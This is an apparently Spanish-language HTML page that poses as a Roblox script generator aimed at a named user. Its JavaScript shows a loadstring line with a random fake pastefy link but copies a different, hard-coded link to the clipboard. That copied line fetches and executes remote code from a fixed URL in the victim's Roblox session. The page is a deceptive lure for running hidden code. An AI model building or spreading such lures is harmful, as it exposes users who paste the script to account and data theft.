<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Roblox - Matiwebhub</title>
    <style>
        body {
            background: #0a0a0f;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1a1a2a;
            padding: 30px;
            border-radius: 20px;
            max-width: 500px;
            width: 100%;
        }
        input, button {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border: none;
            font-size: 16px;
        }
        input {
            background: #0f0f15;
            color: white;
            border: 1px solid #4f46e5;
        }
        button {
            background: #4f46e5;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #7c3aed;
        }
        .resultado {
            background: #0f0f15;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            color: white;
            border-left: 3px solid #4f46e5;
        }
        .error {
            border-left-color: red;
        }
        .success {
            border-left-color: green;
        }
        img {
            border-radius: 50%;
            margin-top: 10px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: white; text-align: center;">MATIWEBHUB TEST</h1>
        <p style="color: gray; text-align: center;">Ingresa un usuario de Roblox</p>
        
        <input type="text" id="username" placeholder="Ejemplo: builderman">
        <button id="buscarBtn">🔍 BUSCAR USUARIO</button>
        
        <div id="resultado" class="resultado hidden">
            <div id="contenidoResultado"></div>
        </div>
        
        <button id="generarScriptBtn" style="background: #10b981; margin-top: 20px;" disabled>⚡ GENERAR SCRIPT</button>
        
        <div id="scriptOutput" class="resultado hidden">
            <strong>📜 SCRIPT GENERADO:</strong>
            <code id="scriptCode" style="display: block; margin-top: 10px; word-break: break-all;"></code>
            <button id="copiarBtn" style="margin-top: 10px; background: #374151;">📋 COPIAR</button>
        </div>
    </div>

    <script>
        // Elementos
        const usernameInput = document.getElementById('username');
        const buscarBtn = document.getElementById('buscarBtn');
        const resultadoDiv = document.getElementById('resultado');
        const contenidoResultado = document.getElementById('contenidoResultado');
        const generarScriptBtn = document.getElementById('generarScriptBtn');
        const scriptOutput = document.getElementById('scriptOutput');
        const scriptCode = document.getElementById('scriptCode');
        const copiarBtn = document.getElementById('copiarBtn');
        
        // Variables
        let usuarioActual = null;
        let scriptGenerado = "";
        
        const ENLACE_REAL = "https://pastefy.app/e8DClYOX/raw";
        
        // Función para buscar usuario
        async function buscarUsuario() {
            const username = usernameInput.value.trim();
            
            if (username.length < 3) {
                mostrarResultado("❌ Escribe al menos 3 caracteres", "error");
                return;
            }
            
            mostrarResultado("🔄 Buscando en Roblox...", "");
            generarScriptBtn.disabled = true;
            
            try {
                // Intentar con diferentes APIs
                let encontrado = false;
                let userData = null;
                
                // API 1: api.roblox.com
                try {
                    const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
                    const data = await response.json();
                    if (data && data.Id) {
                        encontrado = true;
                        userData = data;
                    }
                } catch(e) {}
                
                // API 2: Si falla, usar proxy
                if (!encontrado) {
                    const proxy = "https://cors-anywhere.herokuapp.com/";
                    const response = await fetch(proxy + `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=1`);
                    const data = await response.json();
                    if (data.data && data.data.length > 0) {
                        encontrado = true;
                        userData = {
                            Id: data.data[0].id,
                            Username: data.data[0].name
                        };
                    }
                }
                
                if (encontrado && userData) {
                    usuarioActual = {
                        id: userData.Id,
                        nombre: userData.Username
                    };
                    
                    const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${usuarioActual.id}&width=100&height=100&format=png`;
                    
                    mostrarResultado(`
                        <strong>✅ USUARIO ENCONTRADO</strong><br>
                        Nombre: ${usuarioActual.nombre}<br>
                        ID: ${usuarioActual.id}<br>
                        <img src="${avatarUrl}" width="50" height="50" style="border-radius: 50%; margin-top: 10px;">
                        <br><br>
                        <span style="color: #10b981;">👉 Haz clic en "GENERAR SCRIPT" para continuar</span>
                    `, "success");
                    
                    generarScriptBtn.disabled = false;
                    
                } else {
                    mostrarResultado(`❌ Usuario "${username}" no encontrado en Roblox`, "error");
                    usuarioActual = null;
                }
                
            } catch (error) {
                console.error(error);
                mostrarResultado(`❌ Error de conexión: ${error.message}<br><br>💡 Consejo: Abre <a href="https://cors-anywhere.herokuapp.com/" target="_blank" style="color: #4f46e5;">este enlace</a> y pide acceso temporal, luego vuelve a intentar.`, "error");
                usuarioActual = null;
            }
        }
        
        // Función para generar script con ofuscación visual
        function generarScript() {
            if (!usuarioActual) {
                alert("Primero busca un usuario válido");
                return;
            }
            
            // Generar ID falso aleatorio
            const fakeId = Math.random().toString(36).substring(2, 10);
            const fakeLink = `https://pastefy.app/${fakeId}/raw`;
            
            // Script visual (con enlace falso)
            const scriptVisual = `loadstring(game:HttpGet("${fakeLink}"))()`;
            
            // Script real (para copiar)
            scriptGenerado = `loadstring(game:HttpGet("${ENLACE_REAL}"))()`;
            
            scriptCode.textContent = scriptVisual;
            scriptOutput.classList.remove("hidden");
            
            // Mostrar info del target
            const targetInfo = document.createElement("div");
            targetInfo.innerHTML = `<small style="color: #888;">🎯 Target: ${usuarioActual.nombre}</small>`;
            scriptOutput.insertBefore(targetInfo, scriptOutput.firstChild);
        }
        
        // Función para copiar
        function copiarScript() {
            if (!scriptGenerado) {
                alert("No hay script generado");
                return;
            }
            
            navigator.clipboard.writeText(scriptGenerado).then(() => {
                alert("✅ Script REAL copiado (el enlace funciona correctamente)");
            }).catch(() => {
                alert("❌ Error al copiar");
            });
        }
        
        // Mostrar resultado
        function mostrarResultado(mensaje, tipo) {
            resultadoDiv.classList.remove("hidden");
            resultadoDiv.classList.remove("error", "success");
            if (tipo === "error") resultadoDiv.classList.add("error");
            if (tipo === "success") resultadoDiv.classList.add("success");
            contenidoResultado.innerHTML = mensaje;
        }
        
        // Eventos
        buscarBtn.addEventListener("click", buscarUsuario);
        usernameInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") buscarUsuario();
        });
        generarScriptBtn.addEventListener("click", generarScript);
        copiarBtn.addEventListener("click", copiarScript);
        
        console.log("✅ Página de prueba lista - Escribe un usuario y presiona BUSCAR");
    </script>
</body>
</html>
